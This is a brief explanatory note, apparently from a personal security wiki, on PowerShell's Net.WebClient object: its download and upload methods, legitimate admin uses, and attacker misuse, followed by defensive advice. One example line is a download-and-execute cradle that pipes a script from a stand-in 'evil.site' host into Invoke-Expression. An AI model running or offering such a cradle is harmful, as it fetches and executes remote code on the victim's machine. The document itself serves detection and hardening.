This PowerShell command creates a new instance (an object) of the .NET `System.Net.WebClient` class. In less nerdy terms: it gives you a tool for downloading or uploading data via web protocols (such as HTTP, HTTPS, FTP) directly from PowerShell.

$web = New-Object Net.WebClient
Now "$web" is an object. Its methods can be used to fetch (download) or send (upload) data over the network.

**What Does It Do?**
- **`DownloadString(<url>)`:** Grabs the text from a URL.
- **`DownloadFile(<url>, <path>)`:** Downloads a file to your machine.
- **`UploadString(<url>, <data>)`:** Sends data to a web server.
- $content = $web.DownloadString("https://example.com/data.txt")
- [[Invoke-Expression]] ($web.DownloadString("http://evil.site/bad.ps1"))

## Why Do Attackers (and Admins) Like It?

### The Good

- **Admins:** Automate downloads and updates, fetch scripts, interact with REST APIs, or report system status to dashboards.
- **DevOps:** Use it for deployment pipelines, configuration fetching, etc.

### The Bad (and the Ugly)

- **Attackers:** Love it because they can download tools, scripts, payloads, or establish command-and-control—_without leaving tell-tale files behind_.
- **Combo Moves:** Pair with `IEX` (like peanut butter and jelly, but for malware) to execute whatever the attacker downloads—on the spot.


## Practical Security Note

- **Monitor and alert** on unusual uses of `New-Object Net.WebClient`, especially paired with `IEX`.
- **Lock down PowerShell** with Constrained Language Mode and script signing wherever possible.
- **Block outbound PowerShell traffic** to the internet if you don’t need it.


"WebClient" is deprecated in .NET 6 and up.
"HttpClient" is used in its stead.
